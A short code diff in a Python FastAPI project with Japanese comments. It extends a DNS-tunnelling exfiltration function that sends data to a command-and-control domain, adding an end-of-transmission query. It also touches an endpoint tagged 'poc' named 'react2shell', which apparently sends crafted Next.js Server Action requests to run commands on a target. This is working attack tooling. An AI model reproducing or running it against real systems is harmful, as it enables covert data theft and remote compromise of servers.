@@ -62,6 +62,14 @@ def dns_tunneling(original_bytes: bytes, c2_domain: str):
             # 応答がなくてもパケットは送信されているのでOK
             pass
 
+    # 5. 最後にEOFを送信して終了を通知
+    eof_fqdn = f"{session_id}.999.656f66.{c2_domain}"
+    print(f"Sending EOF: {eof_fqdn}")
+    try:
+        resolver.resolve(eof_fqdn, "A", lifetime=1)
+    except:
+        pass    
+
 
 @app.post(f"{app_base_path}/react2shell/command/", tags=["poc"], response_model=dict)
 async def execute_command(body: dict):
@@ -135,7 +143,7 @@ async def execute_command(body: dict):
     headers = {"Next-Action": "x"}  # Server Actionリクエストであることを示す。
     res = requests.post(base_url, files=files, headers=headers, timeout=10)
     print(res.status_code)
-    
+
     # content（生のバイト列）を明示的に UTF-8 でデコードする
     # errors='replace' を入れることで、万が一壊れたバイナリがあってもエラーで止まらない    
     decoded_result = res.content.decode('utf-8', errors='replace')
